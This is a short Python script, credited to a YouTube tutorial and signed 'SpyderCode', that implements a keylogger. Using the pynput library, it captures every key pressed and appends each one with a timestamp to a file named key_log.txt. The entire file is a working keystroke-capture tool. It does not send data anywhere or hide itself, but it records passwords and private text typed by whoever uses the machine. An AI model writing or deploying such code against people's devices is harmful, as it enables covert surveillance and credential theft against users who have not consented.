# -*- coding: utf-8 -*-

#Original code https://www.youtube.com/watch?v=x8GbWt56TlY
"""
Created on Mon Jul 16 00:18:14 2018

@author: Ricardo Echaniz
Github: SpyderCode
          |
      /   |   \
     / /  |  \ \
     \ \_(*)_/ /
      \_(~:~)_/
       /-(:)-\
      / / * \ \
      \ \   / /
       \     /
"""

from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()